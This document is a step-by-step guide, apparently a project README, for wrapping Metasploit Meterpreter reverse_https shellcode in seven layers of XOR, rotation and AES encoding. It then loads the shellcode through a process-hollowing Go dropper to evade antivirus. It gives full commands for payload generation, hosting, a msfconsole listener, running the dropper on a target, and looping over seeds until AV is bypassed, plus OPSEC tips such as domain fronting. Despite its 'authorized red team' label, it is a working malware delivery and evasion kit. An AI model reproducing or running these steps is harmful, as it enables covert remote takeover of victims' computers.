## Custom Meterpreter Encoder - Complete Guide

**FOR AUTHORIZED RED TEAM EXERCISES ONLY**

This system uses **6 layers of polymorphic encoding** on top of AES-256-GCM encryption to evade signature-based detection of Meterpreter payloads.

## How It Works

### Encoding Layers (Applied in Order):

1. **XOR Layer 1** - Random XOR key (changes each build)
2. **ROL (Rotate Left)** - Bit rotation (random 1-7 bits)
3. **ADD Encoding** - Addition cipher (random key)
4. **Byte Swapping** - Swap adjacent bytes
5. **XOR Layer 2** - Second random XOR key
6. **Junk Insertion** - Insert marker bytes (0xAA) before each real byte
7. **AES-256-GCM** - Final encryption layer

### Why This Evades Signatures:

- **Polymorphic**: Each build produces completely different output
- **Multi-layer**: Must reverse 7 layers to get original shellcode
- **No Patterns**: Random keys mean no static signatures
- **Junk Bytes**: Doubles payload size, breaks pattern matching
- **AES Encryption**: Final layer prevents any static analysis

## Quick Start

### Step 1: Generate Meterpreter Payload

```bash
# On Kali
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.88.166 \
  LPORT=443 \
  EXITFUNC=thread \
  -f raw -o payload.raw
```

**Important**: Use `reverse_https` for better evasion!

### Step 2: Encode with Custom Encoder

```bash
# Install pycryptodome if needed
pip3 install pycryptodome

# Encode the payload
python3 encode_shellcode.py payload.raw payload.enc
```

**Output Example:**
```
============================================================
  Custom Shellcode Encoder - Polymorphic Multi-layer
  FOR AUTHORIZED RED TEAM EXERCISES ONLY
============================================================

[+] Generated random AES-256 key:
    a02106e83c2ff25ec9d45151a0f1855cda8eb331cb301916102df6bf864c1c11
[+] Generated random seed: 1234567890

[*] Reading shellcode from: payload.raw
[+] Read 511 bytes
[+] First 8 bytes: fc4883e4f0e8c000

[*] Applying polymorphic encoding...
[+] Layer 1: XOR with key 0x7f
[+] Layer 2: ROL 3 bits
[+] Layer 3: ADD 0xa3
[+] Layer 4: Byte swap
[+] Layer 5: XOR with key 0x5c
[+] Layer 6: Junk insertion (0xAA markers)

[+] Encoded size: 1024 bytes
[+] Size increase: 513 bytes
[+] Ratio: 2.00x

[*] Applying AES-256-GCM encryption...
[+] Final encrypted size: 1056 bytes

[+] Encrypted payload saved to: payload.enc
[+] Decoder parameters saved to: payload_decoder.txt

====================================================================
DECODER PARAMETERS - Copy to your dropper:
====================================================================

// Decoder parameters (generated by encode_shellcode.py)
const (
    DECODER_SEED     = 1234567890
    XOR_KEY1         = 0x7f
    ROL_BITS         = 3
    ADD_KEY          = 0xa3
    XOR_KEY2         = 0x5c
    ORIGINAL_LENGTH  = 511
    ENCODED_LENGTH   = 1024
)

====================================================================
AES KEY - Copy to your dropper:
====================================================================
const AES_KEY = "a02106e83c2ff25ec9d45151a0f1855cda8eb331cb301916102df6bf864c1c11"
```

### Step 3: Update Dropper Code

Edit `hollower-dropper-custom.go`:

1. **Replace decoder parameters** (lines 18-26):
```go
const (
    DECODER_SEED     = 1234567890    // FROM OUTPUT
    XOR_KEY1         = 0x7f          // FROM OUTPUT
    ROL_BITS         = 3             // FROM OUTPUT
    ADD_KEY          = 0xa3          // FROM OUTPUT
    XOR_KEY2         = 0x5c          // FROM OUTPUT
    ORIGINAL_LENGTH  = 511           // FROM OUTPUT
    ENCODED_LENGTH   = 1024          // FROM OUTPUT
)
```

2. **Replace AES key** (line 31):
```go
const AES_KEY = "a02106e83c2ff25ec9d45151a0f1855cda8eb331cb301916102df6bf864c1c11"
```

3. **Update payload URL** (line 30):
```go
const PAYLOAD_URL = "http://192.168.88.166:8000/payload.enc"
```

### Step 4: Build the Dropper

```bash
cd c:\Users\Uporabnik\OneDrive\Desktop\Game

# Build for Windows (stripped binary for smaller size)
set GOOS=windows
set GOARCH=amd64
go build -ldflags="-s -w" -o dropper-custom.exe hollower-dropper-custom.go
```

The `-ldflags="-s -w"` strips debug symbols for smaller binary.

### Step 5: Host the Payload

```bash
# On Kali
cd ~/AzRTE  # Or wherever payload.enc is
python3 -m http.server 8000
```

### Step 6: Set Up Listener

```bash
# On Kali
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 192.168.88.166
set LPORT 443
set ExitOnSession false
exploit -j
```

### Step 7: Execute on Target

```cmd
# Transfer dropper-custom.exe to target
# Run it:
dropper-custom.exe
```

## Advanced Usage

### Use Same Keys for Multiple Builds

To avoid rebuilding the dropper, reuse the same keys:

```bash
# Save your keys
AES_KEY="a02106e83c2ff25ec9d45151a0f1855cda8eb331cb301916102df6bf864c1c11"
SEED=1234567890

# Re-encode with same keys
python3 encode_shellcode.py payload.raw payload.enc $AES_KEY $SEED
```

This way you can update just the payload without recompiling!

### Generate Unique Key Per Target

For better OPSEC:

```bash
# Each target gets unique encoding
python3 encode_shellcode.py payload.raw payload_target1.enc
python3 encode_shellcode.py payload.raw payload_target2.enc

# Different parameters for each
# Helps track which target was compromised
```

### Test Different Encoding Seeds

```bash
# Try different seeds to find one that bypasses AV
for seed in {1000..1100}; do
    python3 encode_shellcode.py payload.raw test_$seed.enc $AES_KEY $seed
    # Test each one
done
```

## Troubleshooting

### "Decryption failed"

- Make sure AES_KEY in dropper matches encryption key
- Check that payload.enc file transferred correctly
- Verify file size matches expected

### "Size mismatch after decoding"

- ORIGINAL_LENGTH must match your shellcode size
- ENCODED_LENGTH should be ~2x original
- Check all decoder parameters were copied correctly

### Still Getting Detected

If still detected, try:

1. **Use HTTPS instead of HTTP**:
```go
const PAYLOAD_URL = "https://192.168.88.166:8443/payload.enc"
```

2. **Change target process**:
```go
// Instead of dllhost.exe
ProcessHollow(payload, "C:\\Windows\\System32\\RuntimeBroker.exe")
```

3. **Add more delays**:
```go
time.Sleep(30 * time.Second)  // Longer initial delay
```

4. **Rebuild with different seed**:
```bash
python3 encode_shellcode.py payload.raw payload.enc $AES_KEY 9999999
```

## Understanding the Decoding Process

The dropper reverses the encoding in opposite order:

1. **AES Decrypt** → encrypted blob
2. **Remove Junk** → every other byte (0xAA markers)
3. **XOR with KEY2** → reverse second XOR
4. **Byte Unswap** → restore original order
5. **SUB** → reverse addition
6. **ROR** → reverse rotation
7. **XOR with KEY1** → original meterpreter shellcode

Each layer makes it exponentially harder for AV to recognize the payload.

## File Overview

- `encode_shellcode.py` - Python encoder (run on Kali)
- `hollower-dropper-custom.go` - Dropper with decoder (build on Windows)
- `payload.raw` - Original meterpreter shellcode
- `payload.enc` - Encoded + encrypted payload
- `payload_decoder.txt` - Decoder parameters (auto-generated)

## Security Notes

### Why This Is Better Than Simple XOR/AES

| Feature | Simple XOR | AES Only | Custom Encoder |
|---------|-----------|----------|----------------|
| Encryption | Weak | Strong | Strong |
| Polymorphic | No | No | **Yes** |
| Layers | 1 | 1 | **7** |
| Unique per build | No | No | **Yes** |
| Breaks signatures | Maybe | Maybe | **Yes** |
| Runtime decoding | Simple | Simple | **Complex** |

### OPSEC Considerations

- Each encoding produces **unique output** - no two builds are the same
- AV signatures can't be written for this without reverse engineering YOUR specific build
- The decoder itself has no signatures (it's just math operations)
- Change seed frequently to stay ahead

## Example Complete Workflow

```bash
# ===== ON KALI =====

# 1. Generate payload
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.88.166 LPORT=443 EXITFUNC=thread \
  -f raw -o payload.raw

# 2. Encode it
python3 encode_shellcode.py payload.raw payload.enc

# 3. Copy the output parameters

# 4. Start web server
python3 -m http.server 8000 &

# 5. Start listener
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 192.168.88.166; set LPORT 443; exploit"

# ===== ON WINDOWS BUILD MACHINE =====

# 6. Edit hollower-dropper-custom.go
# - Paste decoder parameters
# - Paste AES key
# - Update PAYLOAD_URL

# 7. Build
cd c:\Users\Uporabnik\OneDrive\Desktop\Game
set GOOS=windows && set GOARCH=amd64 && go build -ldflags="-s -w" -o dropper.exe hollower-dropper-custom.go

# 8. Transfer dropper.exe to target

# ===== ON TARGET =====

# 9. Execute
dropper.exe

# ===== BACK ON KALI =====

# 10. Wait for session!
# You should see:
# [*] Meterpreter session 1 opened
```

## Success Indicators

When it works, you'll see:

```
msf6 exploit(multi/handler) >
[*] https://192.168.88.166:443 handling request from 192.168.88.200
[*] Meterpreter session 1 opened (192.168.88.166:443 -> 192.168.88.200:xxxxx)

meterpreter > sysinfo
Computer        : TARGET-PC
OS              : Windows 10 (10.0 Build 19044).
Architecture    : x64
System Language : en_US
Meterpreter     : x64/windows
```

## Tips for Maximum Evasion

1. **Always use reverse_https** (not reverse_tcp)
2. **Change target process** (not calc.exe/notepad.exe)
3. **Host on port 80 or 443** (common ports)
4. **Use domain fronting** if possible
5. **Generate unique keys per operation**
6. **Test in isolated VM first**
7. **Don't upload to VirusTotal!**

Good luck with your authorized red team exercise!
